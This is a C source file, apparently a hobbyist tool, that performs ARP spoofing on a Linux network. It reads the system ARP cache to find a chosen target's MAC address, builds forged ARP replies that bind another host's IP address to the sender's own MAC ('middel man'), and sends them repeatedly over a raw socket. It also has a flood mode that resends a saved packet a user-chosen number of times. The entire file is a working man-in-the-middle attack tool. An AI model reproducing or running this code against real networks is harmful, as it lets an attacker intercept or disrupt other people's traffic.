#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <unistd.h> //sleep

//ARP file
#define ARP_TABEL  "/proc/net/arp"


//link Layer Sock Discriptor 
typedef struct {
                  unsigned short sll_family;
                  unsigned short sll_protocol;
                  int            sll_ifindex;
                  unsigned short sll_hatype;
                  unsigned char  sll_pkttype;
                  unsigned char  sll_halen;
                  unsigned char  sll_addr[8];  
}__attribute__((packed)) LL_SockAddr;

//Ether Header 14 byte
typedef struct {
                       unsigned char dst_addr[6];
                       unsigned char src_addr[6];
                       unsigned int  type : 16;
} __attribute__((packed)) EtherNetFram;

//ARP Header // 28 Byte
typedef struct {
      unsigned char HTYPE[2]; //Hardware type
      unsigned char PTYPE[2]; //Protocol type
      unsigned char HLEN[1];  //Hardware len
      unsigned char PLEN[1];  //Protocol len
      unsigned char OPER[2];  //Opration
      
      unsigned char SHA_2[2]; //Sender hardware Addr *first 2 byte
      unsigned char SHA_4[2]; // nxt 2 byte
      unsigned char SHA_6[2]; // last 2 byte
      
      unsigned char SPA_2[2]; //Sender Protocol Addr *first 2 byte
      unsigned char SPA_4[2]; // last 2 byte

      unsigned char THA_2[2]; //Target Hardware Addr *first 2 byte
      unsigned char THA_4[2];
      unsigned char THA_6[2]; 

      unsigned char TPA_2[2]; //Target Protocol Addr *first 2 byte
      unsigned char TPA_4[2];

}__attribute((packed)) ARP_Packet;

//Function Decleration
void getInterface();
void decodeEther(unsigned char *buf, EtherNetFram *eth ,int debug);
void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug);
void writeToFile(unsigned char *data, int len,unsigned char *fileName);
void getTargetInfo(unsigned char *target);
int  find(char *buffer, char *pattern, int len);
void craftArpPayload(unsigned char *targetIP, int forReqt);
void deploy(unsigned char *payload, int payloadSize);

void flood();

//Globel Var
int MAXMSG = 65536;
int socket_desc;
struct sockaddr addr;
int DataSize;
int run = 1;
int interface_index = 0;

//Ip char buffer
unsigned char target [15]; //i.g 192.150.160.10   
unsigned char target_bin[4]; // ip in binary formate
unsigned char target_mac [6];
unsigned char mask [15];  //i.g 192.150.160.101   
unsigned char mask_bin[4]; // ip in binary formate


LL_SockAddr ll_sock_disc;
EtherNetFram eth, eth_replay;
ARP_Packet arp_packet, arp_packet_replay;
const int TARGET = 71; //152;
// T-mac : D0:17:C2:9C:42:28

unsigned char broadcast_Add[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
unsigned char zero_Add[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
unsigned char test_TAdd[6] = {0xd0, 0x17, 0xc2, 0x9c, 0x41, 0x6f}; //Naveenj
                              
//Mask src addrs
unsigned char srcAddr[6] = {0xd0, 0x17, 0xc2, 0x9c, 0x42, 0x28};
unsigned char own_mac_Add[6] = {0x9c,0x5c,0x8e,0x8e,0x6e,0xbe}; //middel man
unsigned char own_ip_Add[4];

unsigned char ipAdd[4]   =  {0xC0,0xA8,0x01,0x98}; //152 



//Dep;loy
void deploy1(){
   
   int newSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
   
   if(newSock > 0){

       // initialize link layer sock discriptor 
       ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
       ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
       ll_sock_disc.sll_ifindex  = interface_index;
       ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
       ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
       ll_sock_disc.sll_halen    = '6';
       memcpy(ll_sock_disc.sll_addr, eth_replay.dst_addr, 6);

       //debug ll sock
       printf("\n\n family :%d",ll_sock_disc.sll_family);
       printf("\n protocol :%d",ll_sock_disc.sll_protocol);
       printf("\n if index :%d",ll_sock_disc.sll_ifindex);
       printf("\n hatype :%d",ll_sock_disc.sll_hatype);
       printf("\n pkt type :%c",ll_sock_disc.sll_pkttype);
       printf("\n ha-len :%c",ll_sock_disc.sll_halen);
       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc.sll_addr[0], ll_sock_disc.sll_addr[1], ll_sock_disc.sll_addr[2], ll_sock_disc.sll_addr[3], ll_sock_disc.sll_addr[4], ll_sock_disc.sll_addr[5]);
       
       printf("\n LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc));

        unsigned char payload[14+28];
        memcpy(payload, &eth_replay, 14);
        memcpy(&payload[14], &arp_packet_replay, 28);
        printf("\n Deploy on sock :%d",newSock);
        printf("\n Delpoy payload size :%d",(int)sizeof(payload));

        
        //Bind
         int bindStatus = bind(newSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
         printf("\n bind status :%d, errorCode :%d",bindStatus,errno); 
        //Send               
        // int status = sendto(newSock, payload, sizeof(payload), 0,  (struct sockaddr*)&ll_sock_disc, sizeof(ll_sock_disc));
        int status = send(newSock, payload, sizeof(payload), 0);

        printf("\n\n Deploy status :%d, errorNo:%d\n",status,errno);
        
        //Debug Payload
        decodeEther(payload,&eth,1);
        decodeARP(payload, &arp_packet,1);
        char fileName[5]={'l','o','g','q','q'};  
        writeToFile(payload,sizeof(payload),fileName);
        printf("\nPayload Deployed...");
        
   }
}

//Craft PAyload
void craftPayload(){
    
    //eth header
      memcpy(eth_replay.src_addr, own_mac_Add, 6);
      memcpy(eth_replay.dst_addr, eth.src_addr, 6);
      eth_replay.type = eth.type;

    //Arp Header
      memcpy(&arp_packet_replay, &arp_packet, 28);
      arp_packet_replay.OPER[0] = 0x00;
      arp_packet_replay.OPER[1] = 0x02; //Replay byte
      
      //Middel man 
      memcpy(arp_packet_replay.SHA_2 , own_mac_Add, 2);
      memcpy(arp_packet_replay.SHA_4 , &own_mac_Add[2], 2);
      memcpy(arp_packet_replay.SHA_6 , &own_mac_Add[4], 2);

      memcpy(arp_packet_replay.SPA_2 , arp_packet.TPA_2, 2);
      memcpy(arp_packet_replay.SPA_4 , arp_packet.TPA_4, 2);

      //Destination swap
      memcpy(arp_packet_replay.THA_2, arp_packet.SHA_2, 2);
      memcpy(arp_packet_replay.THA_4, arp_packet.SHA_4, 2);
      memcpy(arp_packet_replay.THA_6, arp_packet.SHA_6, 2);

      memcpy(arp_packet_replay.TPA_2, arp_packet.SPA_2, 2);
      memcpy(arp_packet_replay.TPA_4, arp_packet.SPA_4, 2);        

    printf("\nPayload Crafted ...");
    // deploy();
} 


//Flood Mode
void flood(){
  //GEt PAyload  
  unsigned char payload[42];

  FILE *logFile = fopen("/home/satyaprakash/Algo/arp_payload","rb");
      if(logFile == NULL){
        printf("Failed to open file ..\n");
      }
      else{
         printf("\n reading File data...");
         fread(payload,1,42,logFile);
         fclose(logFile);
         
         //craft link layer header
           int newSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
   
           if(newSock > 0){
                // initialize link layer sock discriptor 
                ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
                ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
                ll_sock_disc.sll_ifindex  = interface_index;
                ll_sock_disc.sll_hatype   = 1;//0 // Not required  0 for nothing
                ll_sock_disc.sll_pkttype  = htons(PACKET_BROADCAST); //'0'; // Not required  0 for nothing
                ll_sock_disc.sll_halen    = 0x06;//'6';
                memcpy(ll_sock_disc.sll_addr, payload, 6);
                
                //Bind
                int bindStatus = bind(newSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
                printf("\n bind status :%d, errorCode :%d",bindStatus,errno); 
                //Send               
                // int status = sendto(newSock, payload, sizeof(payload), 0,  (struct sockaddr*)&ll_sock_disc, sizeof(ll_sock_disc));
                printf("\n No of payloads to send ..");
                int no_payloads = 1;
                scanf("%d",&no_payloads);
                for(int x=0; x <= no_payloads; x++ ){
                    int status = send(newSock, payload, sizeof(payload), 0);
                    
                    if(status < 0){
                      printf("\n Deploy payload :%d, payload Size :%d, errorCode:%d",x,status,errno);
                      break;
                      }
                }
            } 
        }   
}


void main(){
 
 int mode = 1;
 
 getInterface();
 
 //
 //  flood();
 //  return;
 //
 printf("\n\n ** Mode **\nSniper : 1 \nBurst : 0\n=>");
 scanf("%d",&mode);

 if(mode == 1){
   printf("\nTarget src =>");
   scanf("%s",target);

   //convert string ip to network formate *binary ip
   struct sockaddr_in saddr_ip;
   inet_pton(AF_INET, target, &saddr_ip.sin_addr);
   memcpy(target_bin, &saddr_ip.sin_addr, 4);
   printf("\n Target src binary to string ipv4 =>%d.%d.%d.%d",(int)target_bin[0],(int)target_bin[1],(int)target_bin[2],(int)target_bin[3]); //debug
   
   printf("\nTarget dst =>");
   scanf("%s",mask);
   
   //convert string ip to network formate *binary ip
   inet_pton(AF_INET, mask, &saddr_ip.sin_addr);
   memcpy(mask_bin, &saddr_ip.sin_addr, 4);
   printf("\n Target dst binary to string ipv4 =>%d.%d.%d.%d",(int)mask_bin[0],(int)mask_bin[1],(int)mask_bin[2],(int)mask_bin[3]); //debug
   

   getTargetInfo(target);
  }

 else{
   printf("\n Burst mode");
   return;
  } 

  return;
 }

 

    //  unsigned char buf[MAXMSG];
    //                                  //SOCK_PACKET 
    //  socket_desc = socket(AF_PACKET, SOCK_PACKET,htons(0x0003));
        
    //     if(socket_desc == -1){
    //      printf("\nFailed to create socket ..\n");
    //      }
        
    //     else{
    //           printf("\nSocket created ready to flood :%d\n",socket_desc);
            
    //           int size =  sizeof addr;
    //           int data;
    //           while(run){
    //               DataSize = data = recvfrom(socket_desc, buf, sizeof(buf), 0, NULL, NULL);
    //                 if(data < 0){
    //                     printf("\nCan not get any packets, status :%d\n",data);
    //                 }
    //                 else{
    //                     // printf("\n\n.........Intercept Some data size..%d\n",data);
    //                     // EtherNetFram eth;
    //                     decodeEther(buf,&eth,0);
    //                     // printf("\n eth type :%02X",htons(eth.type));
    //                     if(htons(eth.type) == 0X0806)
    //                         decodeARP( buf, &arp_packet,0);
    //                     }
    //             }//While
        
    //     } 

// }



//Get interface index & info
void getInterface(){
     
    unsigned char ifName[]={'e','n','p','3','s','0'};  
                             // enp3s0
    struct ifreq ifr;
    memcpy(ifr.ifr_name, ifName, sizeof(ifName));

    int fd = socket(AF_INET,SOCK_DGRAM,0);
    if(fd != -1){
       
       if(ioctl(fd, SIOCGIFINDEX, &ifr) != -1 ){
          printf("\n Enterface :%s index :%d",ifName, ifr.ifr_ifindex);
          interface_index = ifr.ifr_ifindex;
       }
       else{
        printf("\n get interface ioclt failed ...%d \n",errno);
        exit(0);
        }
    
       if(ioctl(fd, SIOCGIFHWADDR, &ifr) != -1){
        memcpy(own_mac_Add, ifr.ifr_hwaddr.sa_data, 6); 
        printf("\n Enterface :%s mac =>%0x:%0x:%0x:%0x:%0x:%0x",ifName,own_mac_Add[0],own_mac_Add[1],own_mac_Add[2],own_mac_Add[3],own_mac_Add[4],own_mac_Add[5]);
       }
       else{
       printf("\n get interface ioclt failed ...%d \n",errno);
       exit(0);
       }
     
       if(ioctl(fd, SIOCGIFADDR, &ifr) != -1){

        struct sockaddr_in *ipAddr = (struct sockaddr_in *) &ifr.ifr_addr;
        struct in_addr *inAddr     = (struct in_addr *) &ipAddr->sin_addr;
        memcpy(own_ip_Add, &inAddr->s_addr, 4);
        printf("\n Enterface :%s ipv4 =>%d.%d.%d.%d",ifName,(int)own_ip_Add[0],(int)own_ip_Add[1],(int)own_ip_Add[2],(int)own_ip_Add[3]);
       }
       else{
        printf("\n get interface ioctl failed ...%d \n",errno);
        exit(0);
       }
  
    }
    else{
     printf("\n get interface info sock creation failed ...%d \n",errno);
     exit(0);}

    
}

//
void writeToFile(unsigned char *data, int len,unsigned char *fileName){ 
    ///home/satyaprakash/Algo/
 FILE *logFile = fopen(fileName,"ab");
      if(logFile == NULL){
        printf("Failed to open file ..\n");
      }
      else{
         printf("\n writing to File data:%d",len);
         fwrite(data,1,len,logFile); 
         fclose(logFile);
      } 
} 

//DeCode EtherNet
void decodeEther(unsigned char *buf, EtherNetFram *eth ,int debug){
     if(debug){
        printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
        printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
        printf("\n type => %02X:%02X",buf[12],buf[13]);
      } 
      memcpy(eth,buf,14);
}


 //Decode ARP
void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug){

 if(buf!=NULL){ 
  memcpy(arp, &buf[14], 28);
  }
 else{
  memcpy(&arp_packet, &arp, 28);
  printf("\n buf is null");
  }
  
 // if Some one is looking for target then help him !..
      printf("\n Arp trafic...");

    // if((int)arp_packet.TPA_4[1] == TARGET && arp_packet.OPER[1] == 0x01 || debug == 1){
        printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
        printf("\n Ptype :%02x:%02x",arp_packet.PTYPE[0],arp_packet.PTYPE[1]);
        printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
        printf("\n HLEN :%02X",arp_packet.HLEN[0]);
        printf("\n PLEN :%02X",arp_packet.PLEN[0]);
        if(arp_packet.OPER[1] == 0x01){
        printf("  Request");
        }
        else{
        printf("  Replay");
        }

        printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.SHA_2[0],arp_packet.SHA_2[1], arp_packet.SHA_4[0],arp_packet.SHA_4[1], arp_packet.SHA_6[0],arp_packet.SHA_6[1]);
        printf("  SPA => %d.%d.%d.%d",(int)arp_packet.SPA_2[0],(int)arp_packet.SPA_2[1], (int)arp_packet.SPA_4[0],(int)arp_packet.SPA_4[1]);
        printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
        printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);

        // //become imposter
        // if((int) arp_packet.TPA_4[1] == TARGET && debug == 0)
        // craftPayload();
    // }
}


//GEt Target info from arp tabel
void getTargetInfo(unsigned char * target){
    //find in arp tabel
    
    FILE *arpCache = fopen(ARP_TABEL, "r");
    if(arpCache!=NULL){
      unsigned char buffe[80]; // 79
      char c;
      int i = 0;
      int targetFound = 0;
      do{
          //buffe[i] = (char)fgetc(arpCache);
          //printf("\n i :%d",i); 
          buffe[i] = c =(char)fgetc(arpCache);
          // printf("\n arp Cache len =>%c, hex :%x  i =>%d",buffe[i], buffe[i], i);
          i++;

          if( 0xa == buffe[i-1]){ // on new line
               i = 0;     
             // find target in buffer
             // printf("\n\nfinding Target ......... i :%d",i);
               if( find(buffe,target,15) ){
               printf("\n Target found in Arp tabel.");
               targetFound = 1;
             // get target mac
               target_mac[0] = strtol(&buffe[41],NULL,16);
               target_mac[1] = strtol(&buffe[44],NULL,16);
               target_mac[2] = strtol(&buffe[47],NULL,16);
               target_mac[3] = strtol(&buffe[50],NULL,16);
               target_mac[4] = strtol(&buffe[53],NULL,16);
               target_mac[5] = strtol(&buffe[56],NULL,16);

               printf("\n Target Mac => %02X:%02X:%02X:%02X:%02X:%02X",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
            }
          }
      }
      while( c != EOF && !targetFound);

      //
       printf("\n arp cache file closed :%d",fclose(arpCache) );
      if(!targetFound){
       //boradcast arp request
       printf("\n Target Not found in ARP Tabel.");
       exit(0);
       //craftArpPayload(target_bin,1);
      }
      else{
        
         craftArpPayload(target_bin,0);
      }

    }

    //requerst target mac

}

//Patern Match
int find(char *buffer, char *pattern, int len){
  //here 0x20 is 'space' charecter in assci
   for(int i=0; i<len; i++){
      //printf("\n matcheing => %c == %c",buffer[i],pattern[i]); //Debug
      if(pattern[i] != 0x00 && buffer[i] != 0x20){
        if(buffer[i] != pattern[i])
          return 0;
      }
   }
   return 1;
} 


//Craft ARP request payload
void craftArpPayload(unsigned char *targetIP,int forReqt){
     
     printf("\n Crafting ARP Request payload...\n");
  //eth header
      memcpy(eth_replay.src_addr, &own_mac_Add, 6);
      if(forReqt)
        memcpy(eth_replay.dst_addr, &broadcast_Add, 6);
      else
        memcpy(eth_replay.dst_addr, &target_mac, 6);
      eth_replay.type =  htons(0x0806);
      
    //Arp Header
      arp_packet_replay.HTYPE[0] = 0x00;
      arp_packet_replay.HTYPE[1] = 0x01;
      
      arp_packet_replay.PTYPE[0] = 0x08;
      arp_packet_replay.PTYPE[1] = 0x00;  // ETH_P_IP 0x0800
      
      arp_packet_replay.HLEN[0]  = 0x06; // Hardware address len
      arp_packet_replay.PLEN[0]  = 0x04; // Protocol address len 

      arp_packet_replay.OPER[0] = 0x00;
      arp_packet_replay.OPER[1] = forReqt == 1 ? 0x01 : 0x02 ; //Request or reply byte
      
      //src
      memcpy(arp_packet_replay.SHA_2 , own_mac_Add, 2);
      memcpy(arp_packet_replay.SHA_4 , &own_mac_Add[2], 2);
      memcpy(arp_packet_replay.SHA_6 , &own_mac_Add[4], 2);
      
      if(forReqt){
        memcpy(arp_packet_replay.SPA_2 , &own_ip_Add, 2);
        memcpy(arp_packet_replay.SPA_4 , &own_ip_Add[2], 2);
        
        //Destination 
        memcpy(arp_packet_replay.THA_2, &zero_Add, 2);
        memcpy(arp_packet_replay.THA_4, &zero_Add[2], 2);
        memcpy(arp_packet_replay.THA_6, &zero_Add[4], 2);

        memcpy(arp_packet_replay.TPA_2, &target_bin, 2);
        memcpy(arp_packet_replay.TPA_4, &target_bin[2], 2);        

      }
      else{
        memcpy(arp_packet_replay.SPA_2 , &mask_bin, 2);
        memcpy(arp_packet_replay.SPA_4 , &mask_bin[2], 2);

        //Destination 
        memcpy(arp_packet_replay.THA_2, &target_mac, 2);
        memcpy(arp_packet_replay.THA_4, &target_mac[2], 2);
        memcpy(arp_packet_replay.THA_6, &target_mac[4], 2);
    
        memcpy(arp_packet_replay.TPA_2, &target_bin, 2);
        memcpy(arp_packet_replay.TPA_4, &target_bin[2], 2);        

      }

    
      printf("\nPayload Crafted ...");

        // //Debug crafted Eth 
        // printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",eth_replay.dst_addr[0], eth_replay.dst_addr[1], eth_replay.dst_addr[2], eth_replay.dst_addr[3], eth_replay.dst_addr[4], eth_replay.dst_addr[5]);
        // printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",eth_replay.src_addr[0], eth_replay.src_addr[1], eth_replay.src_addr[2], eth_replay.src_addr[3], eth_replay.src_addr[4], eth_replay.src_addr[5]);
        // printf("\n type => %04X",eth_replay.type);

        // //Debug crafted Arp  
        // printf("\n Htype %02X,%02X",arp_packet_replay.HTYPE[0],arp_packet_replay.HTYPE[1]);
        // printf("\n Ptype :%02x:%02x", arp_packet_replay.PTYPE[0], arp_packet_replay.PTYPE[1]);
        // printf("\n OPER  :%02X,%02X",arp_packet_replay.OPER[0],arp_packet_replay.OPER[1]);
        // if(arp_packet_replay.OPER[1] == 0x01){
        // printf("  Request");
        // }
        // else{
        // printf("  Replay");
        // }

        // printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet_replay.SHA_2[0],arp_packet_replay.SHA_2[1], arp_packet_replay.SHA_4[0],arp_packet_replay.SHA_4[1], arp_packet_replay.SHA_6[0],arp_packet_replay.SHA_6[1]);
        // printf("  SPA => %d.%d.%d.%d",(int)arp_packet_replay.SPA_2[0],(int)arp_packet_replay.SPA_2[1], (int)arp_packet_replay.SPA_4[0],(int)arp_packet_replay.SPA_4[1]);
        // printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet_replay.THA_2[0],arp_packet_replay.THA_2[1], arp_packet_replay.THA_4[0],arp_packet_replay.THA_4[1], arp_packet_replay.THA_6[0],arp_packet_replay.THA_6[1]);
        // printf("  TPA => %d.%d.%d.%d \n\n", (int)arp_packet_replay.TPA_2[0], (int)arp_packet_replay.TPA_2[1], (int)arp_packet_replay.TPA_4[0],(int)arp_packet_replay.TPA_4[1]);
      

      //Send
      unsigned char payload[14+28];
      memcpy(payload, &eth_replay, 14);
      memcpy(&payload[14], &arp_packet_replay, 28);
      
      deploy(payload, sizeof(payload));
      
      //Debug
      decodeEther(payload,&eth,1);
      decodeARP(payload,&arp_packet,1);

}


//Send 
//Dep;loy
void deploy(unsigned char *payload, int payloadSize){
   printf("\n Deploying Payload ....");

   int newSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
   
   if(newSock > 0){
      printf("\n Deploying socket is created ....");

                // initialize link layer sock discriptor 
                ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
                ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
                ll_sock_disc.sll_ifindex  = interface_index;
                ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
                ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
                ll_sock_disc.sll_halen    = '6';
                memcpy(ll_sock_disc.sll_addr, payload, 6);
      

       //debug ll sock
       printf("\n\n family :%d",ll_sock_disc.sll_family);
       printf("\n protocol :%d",ll_sock_disc.sll_protocol);
       printf("\n if index :%d",ll_sock_disc.sll_ifindex);
       printf("\n hatype :%d",ll_sock_disc.sll_hatype);
       printf("\n pkt type :%c",ll_sock_disc.sll_pkttype);
       printf("\n ha-len :%02x",ll_sock_disc.sll_halen);
       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc.sll_addr[0], ll_sock_disc.sll_addr[1], ll_sock_disc.sll_addr[2], ll_sock_disc.sll_addr[3], ll_sock_disc.sll_addr[4], ll_sock_disc.sll_addr[5]);
       
       printf("\n LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc));

      
        //Bind
         int bindStatus = bind(newSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
         printf("\n\n bind status :%d, errorCode :%d",bindStatus,errno); 
        
        //Send               
        // int status = sendto(newSock, payload, sizeof(payload), 0,  (struct sockaddr*)&ll_sock_disc, sizeof(ll_sock_disc));
        //int status = send(newSock, &payload, payloadSize,0);
        
        int shots = 0;
        // printf("\n\n single shot :0 \n keep it loocked :1\n");
        printf("\n\n Shots :");
        scanf("%d",&shots);
        int status = 0;
        while(shots != 0){
            status = send(newSock, payload, 42, 0);
            // printf("\n Deploy status : %d, errorCode : %d\n shots :%d\n",status,errno,shots);
            sleep(0.3);
            shots--;
        }
        

        if(status == -1)
        printf("\n\n Deploy status :%d, errorNo:%d\n",status,errno);
        else
        printf("\nPayload Deployed succesfuly  %d.\n",errno);
        
   }
   else{
     printf("\n Deploying socket cretion failed  :%d",errno);
   }
}

